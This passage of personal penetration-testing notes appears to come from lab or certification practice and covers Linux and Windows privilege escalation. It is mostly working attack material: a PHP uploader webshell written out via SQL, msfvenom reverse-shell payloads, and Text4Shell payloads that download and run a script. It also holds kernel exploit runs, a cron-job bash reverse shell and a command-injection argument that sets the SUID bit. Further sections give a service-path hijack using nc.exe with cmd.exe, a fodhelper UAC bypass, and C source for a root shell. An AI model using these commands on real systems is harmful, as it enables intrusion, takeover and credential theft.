|"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"|
|INTO OUTFILE 'C:/wamp/www/uploader.php';|
```
- Now put a reverse php webshell here!
	- msfvenom - PHP Web Shell - Raw
```bash
msfvenom -p php/reverse_php LHOST=192.168.45.165 LPORT=443 -f raw > rev.php
```


## CVE-2022-42889 (Text4Shell) - RCE

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > processes > CVE-2022-42889 (Text4Shell) - RCE`

- https://github.com/kljunowsky/CVE-2022-42889-text4shell/blob/main/README.md
```bash
# Use Burp and URL encode

${script:javascript:java.lang.Runtime.getRuntime().exec('whoami')}

${url:UTF-8:java.lang.Runtime.getRuntime().exec('whoami')}

${dns:address:java.lang.Runtime.getRuntime().exec('whoami')}

${script:javascript:java.lang.Runtime.getRuntime().exec('wget+192.168.45.165/shell.sh+-O+/tmp/shell.sh')}

${script:javascript:java.lang.Runtime.getRuntime().exec('bash+/tmp/shell.sh')}
```


## CVE-2022-0847

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Kernel Expoits > CVE-2022-0847`

```
git clone https://github.com/Al1ex/CVE-2022-0847.git
cd CVE-2022-0847
python3 -m http.server 80
```

```
wget http://192.168.45.191:80/exp
chmod +x exp
cp /etc/passwd /tmp/passwd.bak
USERZ@example:~$ ./exp /etc/passwd 1 ootz:
It worked!
USERZ@example:~$ su rootz
rootz@example:/home/USERZ# whoami
rootz
rootz@example:/home/USERZ# id
uid=0(rootz) gid=0(root) groups=0(root)
```


## CVE-2021-3156

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Kernel Expoits > CVE-2021-3156`

```
wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
chmod +x exploit_nss.py

userE@example01:~$ id
uid=1004(userE) gid=1004(userE) groups=1004(userE),998(apache)

userE@example01:~$ python3 exploit_nss.py 
# whoami
root
```


## CVE-2022-2588

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Kernel Expoits > CVE-2022-2588`

```
git clone https://github.com/Markakd/CVE-2022-2588.git
wget http://192.168.119.140/exp_file_credential
chmod +x exp_file_credential
./exp_file_credential
su user
Password: user
id
uid=0(user) gid=0(root) groups=0(root)
```


## CVE-2016-5195

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Kernel Expoits > CVE-2016-5195`

```
https://github.com/firefart/dirtycow
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
uname -a
Linux humble 3.2.0-4-486 #1 Debian 3.2.78-1 i686 GNU/Linux
gcc -pthread dirty.c -o dirty -lcrypt
gcc: error trying to exec 'cc1': execvp: No such file or directory
locate cc1
export PATH=$PATH:/usr/lib/gcc/i486-linux-gnu/4.7/cc1
./dirty
su firefart
```


## CVE-2022-8047

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Kernel Expoits > CVE-2022-8047`

```
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
chmod +x compile.sh
nano exploit-1.c # PoC
nano exploit-2.c
./compile.sh
./exploit-1 # PoC
./exploit-2

OR 

https://github.com/0xsyr0/oscp?tab=readme-ov-file#cve-2022-0847-dirty-pipe-lpe
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 ootz:
su rootz
```


## CVE-2009-2698

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Kernel Expoits > CVE-2009-2698`

```
uname -a
Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNU/Linux
bash-3.00$ id 
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ ./exp
./exp
sh-3.00# id
id
uid=0(root) gid=0(root) groups=48(apache)
```

```
https://github.com/MrG3tty/Linux-2.6.9-Kernel-Exploit
```


## CVE-2021-4034

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Kernel Expoits > CVE-2021-4034`

```
uname -a
Linux dotty 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```
https://github.com/ly4k/PwnKit/blob/main/PwnKit.sh
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit #local
chmod +x PwnKit #local
./PwnKit #Victim Machine
```


## CVE-2021-4034

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Kernel Expoits > CVE-2021-4034`

```
wget https://raw.githubusercontent.com/jamesammond/CVE-2021-4034/main/CVE-2021-4034.py
```


## \[CVE-2012-0056\] memodipper

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Kernel Expoits > \[CVE-2012-0056\] memodipper`

```
wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/memodipper/memodipper.c
gcc memodipper.c -o memodipper #compile on the target not kali
```


## no\_root\_squash

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > NFS Shares > cat /etc/exports > no\_root\_squash`

```
Files created via NFS inherit the remote user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user.

Notice that the /srv share has root squashing disabled. Because of this, on our local machine we can create a mount point and mount the /srv share.

-bash-4.2$ cat /etc/exports
/srv/Share 10.1.1.0/24(insecure,rw)
/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)

"no_root_squash"
```


## Setup

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > NFS Shares > cat /etc/exports > Setup`

```
sshuttle -r sea@10.11.1.251 10.1.1.0/24 #setup
ssh -L 6070:127.0.0.1:2049 userc@10.1.1.27 -N #tunnel for 127.0.0.1 /srv/Share
mkdir /mnt/tmp
scp userc@10.1.1.27:/bin/bash . #copy over a reliable version of bash from the victim
chown root:root bash; chmod +s bash #change ownership and set sticky bit
ssh userc@10.1.1.27 #login to victim computer
```


## Exploit

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > NFS Shares > cat /etc/exports > Exploit`

```
cd /srv/Share
ls -la #check for sticky bit
./bash -p #how to execute with stick bit
whoami
```


## cat /etc/shadow

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > NFS Shares > cat /etc/shadow`

```
root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::                                                                                                              vcsa:!!:15422:0:99999:7:::
pcap:!!:15422:0:99999:7:::
```


## Linpeas

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > Linpeas`

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                              
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*                                                                                                                                                                       
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*
```

```
╔══════════╣ Analyzing Backup Manager Files (limit 70)
                                                                                                                                                                                                                                           
-rw-r--r-- 1 www-data www-data 3896 Mar 31 07:56 /var/www/html/management/application/config/database.php
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
        'password' => '@jCma4s8ZM<?kA',
        'database' => 'school_mgment',
```


## Writable directory

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > MySQL login > Writable directory`

```
find -name / "*borg*"
```

```
/opt/borgbackup
```

```
./pspy64 -pf -i 1000
```

```
BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA'
```


## /usr/local/bin/log\_reader

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > /usr/local/bin/log\_reader`

```
observer@prostore:~$ /usr/local/bin/log_reader 
/usr/local/bin/log_reader 
Usage: /usr/local/bin/log_reader filename.log
```

```
observer@prostore:~$ /usr/local/bin/log_reader /var/log/auth.log
/usr/local/bin/log_reader /var/log/auth.log
Reading: /var/log/auth.log
May 25 22:47:00 prostore VGAuth[738]: vmtoolsd: Username and password successfully validated for 'root'.
```


## Exploit

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > /usr/local/bin/log\_reader > Exploit`

```
observer@prostore:~$ /usr/local/bin/log_reader "/var/log/auth.log;chmod u+s /bin/bash"
</log_reader "/var/log/auth.log;chmod u+s /bin/bash"
Reading: /var/log/auth.log;chmod u+s /bin/bash
May 25 22:47:00 prostore VGAuth[738]: vmtoolsd: Username and password successfully validated for 'root'.
```

```
observer@prostore:~$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

```
bash-5.1$ /bin/bash -p
/bin/bash -p
bash-5.1# id
id
uid=1000(observer) gid=1000(observer) euid=0(root) groups=1000(observer)
bash-5.1# cd /root
cd /root
bash-5.1# cat proof.txt
cat proof.txt
3a7df0bf25481b398003f325d6250ba7
```


## /usr/bin/find

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > /usr/bin/find`

```
find . -exec /bin/sh -p \; -quit
```

```
# id
id
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
```


## /usr/bin/dosbox

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > /usr/bin/dosbox`

```
DOSBox version 0.74-3
```

```
export LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo Sarge ALL=(root) NOPASSWD: ALL >>c:$LFILE"  # May need to CTRL + C after
sudo -s

DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG:Loading primary settings from config file /home/Sarge/.dosbox/dosbox-0.74-3.conf
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
SHELL:Redirect output to c:/etc/sudoers
```

```
[Sarge@example ~]$ sudo -l
Runas and Command-specific defaults for Sarge:
    Defaults!/etc/ctdb/statd-callout !requiretty

User Sarge may run the following commands on example:
    (root) NOPASSWD: ALL
```

```
[Sarge@example ~]$ sudo su
[root@example Sarge]# whoami
root
```


## /usr/bin/cp

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > /usr/bin/cp`

```
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
cat /etc/passwd #copy the contents of this file your kali machine
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin

openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
echo 'hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> passwd

cat passwd 
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
python3 -m http.server #Host the new passwd file
curl http://192.168.119.168/passwd -o passwd #Victim Machine
cp passwd /etc/passwd #This is where the attack is executed

bash-4.2$ su hacker
su hacker
Password: pass123

[root@pain tmp]# id
id
uid=0(root) gid=0(root) groups=0(root)
```


## /usr/bin/screen-4.5.0

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > /usr/bin/screen-4.5.0`

```
https://www.youtube.com/watch?v=RP4hAC96VxQ
```

```
https://www.exploit-db.com/exploits/41154
```

```
uname -a
Linux example 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```


## Setup

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > /usr/bin/screen-4.5.0 > Setup`

```
kali㉿kali)-[/opt/XenSpawn]
└─$ sudo systemd-nspawn -M Machine1
```

```
cd /var/lib/machines/Machine1/root
```

```
vim libhax.c
cat libhax.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

```
vim rootshell.c
cat rootshell.c 
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

```
root@Machine1:~# ls
libhax.c  rootshell.c
root@Machine1:~# gcc -fPIC -shared -ldl -o libhax.so libhax.c
root@Machine1:~# gcc -o rootshell rootshell.c
```


## Attack

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > MySQL Enumeration > /usr/bin/screen-4.5.0 > Attack`

```
cd /tmp
userG@example:/tmp$ wget http://192.168.45.208:80/rootshell
userG@example:/tmp$ wget http://192.168.45.208:80/libhax.so
chmod +x rootshell
chmod +x libhax.so
```

```
userG@example:/$ /tmp/rootshell
/tmp/rootshell
$ id
id
uid=1000(userG) gid=1000(userG) groups=1000(userG)

userG@example:/$ cd /etc
userG@example:/etc$ umask 000
userG@example:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
userG@example:/etc$ ls -l ld.so.preload
userG@example:/etc$ screen-4.5.0 -ls

userG@example:/etc$ /tmp/rootshell
/tmp/rootshell
# id
id
uid=0(root) gid=0(root) groups=0(root)
```


## bash file

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > cat /etc/crontab > bash file`

```
useradm@mailman:~/scripts$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the \`crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    /home/useradm/scripts/cleanup.sh > /dev/null 2>&1

echo " " > cleanup.sh
echo '#!/bin/bash' > cleanup.sh
echo 'bash -i >& /dev/tcp/192.168.119.168/636 0>&1' >> cleanup.sh
nc -nlvp 636 #wait 5 minutes
```


## /usr/local/bin

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > cat /etc/crontab > /usr/local/bin`

[![image](https://private-user-images.githubusercontent.com/127046919/241416915-f48d14b8-897f-4542-b244-53c90d04531f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjQxNDE2OTE1LWY0OGQxNGI4LTg5N2YtNDU0Mi1iMjQ0LTUzYzkwZDA0NTMxZi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03NzNlNzMzNDdiYWQ2YzJkMDI3Yzc5ZGE3ZGE4Mjg2YTczM2YxMTEzZTk1ZGIyYjM0MjBkNzllZDc5YWY2YzgzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.lhyhCtpaeILPDlAuHGDMLqMe5JUVLvIC--UjPT67nKA)](https://private-user-images.githubusercontent.com/127046919/241416915-f48d14b8-897f-4542-b244-53c90d04531f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTAyMDU5MjcsIm5iZiI6MTc1MDIwNTYyNywicGF0aCI6Ii8xMjcwNDY5MTkvMjQxNDE2OTE1LWY0OGQxNGI4LTg5N2YtNDU0Mi1iMjQ0LTUzYzkwZDA0NTMxZi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwNjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDYxOFQwMDEzNDdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03NzNlNzMzNDdiYWQ2YzJkMDI3Yzc5ZGE3ZGE4Mjg2YTczM2YxMTEzZTk1ZGIyYjM0MjBkNzllZDc5YWY2YzgzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.lhyhCtpaeILPDlAuHGDMLqMe5JUVLvIC--UjPT67nKA)

```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the \`crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

```
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=<$your IP> LPORT=21 #Transfer over to /tmp/shell
```

```
chloe@roquefort:/$ cp /tmp/shell /usr/local/bin/run-parts
cp /tmp/shell /usr/local/bin/run-parts
```

```
nc -nlvp 21
listening on [any] 21 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.67] 41624
id
uid=0(root) gid=0(root) groups=0(root)
```


## Scheduled Tasks / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Scheduled Tasks > Enumeration`

```
C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```


## ICACLS

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Scheduled Tasks > ICACLS`

```
C:\Backup>icacls TFTP.EXE
icacls TFTP.EXE
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Admins:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\Authenticated Users:(I)(M)
```

```
BUILTIN\Users: The built-in "Users" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
BUILTIN\Admins: The built-in "Admins" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
NT AUTHORITY\SYSTEM: The "SYSTEM" account has "Full Control" (F) and "Inherit" (I) permissions on the file.
NT AUTHORITY\Authenticated Users: Authenticated users have "Modify" (M) and "Inherit" (I) permissions on the file.
```


## Exploitation

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Scheduled Tasks > Exploitation`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=80 -f exe -o TFTP.EXE #Replace the original file and wait for a shell
```


## Registry Keys

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys`

```
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


## Putty

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > Putty`

```
PS C:\Windows\System32> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
    zachary    REG_SZ    "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
```

```
C:\>systeminfo
systeminfo

Host Name:                 USERB
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 1 Build 2600
```

```
https://sohvaxus.github.io/content/winxp-sp1-privesc.html
unzip Accesschk.zip
ftp> binary
200 Type set to I.
ftp> put accesschk.exe
local: accesschk.exe remote: accesschk.exe
```

```
https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip
```


## Putty / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > Putty > Enumeration`

```
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

accesschk.exe /accepteula -ucqv upnphost #command
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Admins
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS
        
sc qc upnphost #command
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : NT AUTHORITY\LocalService
        
 sc query SSDPSRV #command

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        STATE              : 1  STOPPED 
                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 1077       (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

sc config SSDPSRV start= auto #command
[SC] ChangeServiceConfig SUCCESS
```


## Attack setup

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > Putty > Attack setup`

```
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe" #command
[SC] ChangeServiceConfig SUCCESS

sc config upnphost obj= ".\LocalSystem" password= "" #command
[SC] ChangeServiceConfig SUCCESS

sc qc upnphost #command
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : LocalSystem

nc -nlvp 443 #on your kali machine

net start upnphost #Last command to get shell
```


## Persistance

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > Putty > Persistance`

Sometime our shell can die quick, try to connect right away with nc.exe binary to another nc -nlvp listner

```
nc -nlvp 80

C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe #command
(UNKNOWN) [192.168.119.140] 80 (?) open
```

UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that allows an Admin user to bypass UAC by silently elevating our integrity level from medium to high. As we will soon demonstrate, the fodhelper.exe509 binary runs as high integrity on Windows 10 1709. We can leverage this to bypass UAC because of the way fodhelper interacts with the Windows Registry. More specifically, it interacts with registry keys that can be modified without administrative privileges. We will attempt to find and modify these registry keys in order to run a command of our choosing with high integrity. Its important to check the system arch of your reverse shell.

```
whoami /groups #check your integrity level/to get high integrity level to be able to run mimikatz and grab those hashes
```

```
C:\Windows\System32\fodhelper.exe #32 bit
C:\Windows\SysNative\fodhelper.exe #64 bit
```


## Registry Keys / Powershell

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > Powershell`

Launch Powershell and run the following

```
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\shell.exe" -Force
```

run fodhelper setup and nc shell and check your priority

```
C:\Windows\System32\fodhelper.exe
```


## cmd.exe / Enumeration

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > cmd.exe > Enumeration`

```
whoami /groups
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```


## Exploitation

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > cmd.exe > Exploitation`

```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ #victim machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe #on your kali
certutil -urlcache -split -f http://192.168.119.140:80/shell.exe C:\Windows\Tasks\backup.exe #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Tasks\backup.exe" /f #victim machine
nc -nlvp 80 #on your kali
C:\Windows\system32>fodhelper.exe #victim machine
```


## Final Product

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > Shell > Registry Keys > cmd.exe > Final Product`

```
whoami /groups
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

```
typically this exploit will require manual enumeration. I was able to find a directory called C:\backup\Scripts\<vulnerable script>
```

```
C:\backup\Scripts>dir /q
dir /q
 Volume in drive C has no label.
 Volume Serial Number is 7C9E-C9E6

 Directory of C:\backup\Scripts

04/15/2023  07:20 PM    <DIR>          JAMES\jess            .
04/15/2023  07:20 PM    <DIR>          JAMES\jess            ..
04/15/2023  07:20 PM                 0 JAMES\jess            '
04/15/2023  07:29 PM               782 BUILTIN\Admins backup_perl.pl
05/02/2019  05:34 AM               229 BUILTIN\Admins backup_powershell.ps1
05/02/2019  05:31 AM               394 BUILTIN\Admins backup_python.py
               4 File(s)          1,405 bytes
               2 Dir(s)   4,792,877,056 bytes free
```

```
type backup_perl.pl
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Print the current user
system('whoami');

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
